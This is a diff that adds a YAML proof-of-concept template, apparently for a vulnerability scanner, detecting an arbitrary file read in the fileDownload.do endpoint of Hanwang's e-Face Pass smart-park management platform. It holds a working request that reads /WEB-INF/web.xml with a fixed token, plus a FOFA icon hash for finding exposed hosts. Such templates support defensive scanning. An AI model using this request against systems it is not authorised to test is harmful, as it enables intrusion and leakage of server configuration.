@@ -1,0 +1,15 @@
+id: poc-yaml-hw-e-face-pass-spmp-filedownload-do-anyfile-read
+info:
+  name: 汉王e脸通智慧园区管理平台 fileDownload.do 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: e脸通智慧园区管理平台
+  fofa: icon_hash="1380907357"
+requests:
+- method: GET
+  path: /manage/personnel/fileDownload.do?fileId=/WEB-INF/web.xml&recoToken=ZuZBOrvLG8M
+  expression: status_code == 200 && contains(body,"</web-app>") && contains(body,"<display-name>")
+    && contains(headers,"filename=web.xml") && contains(content_type,"application/octet-stream")
+variables: {}
+transport: http
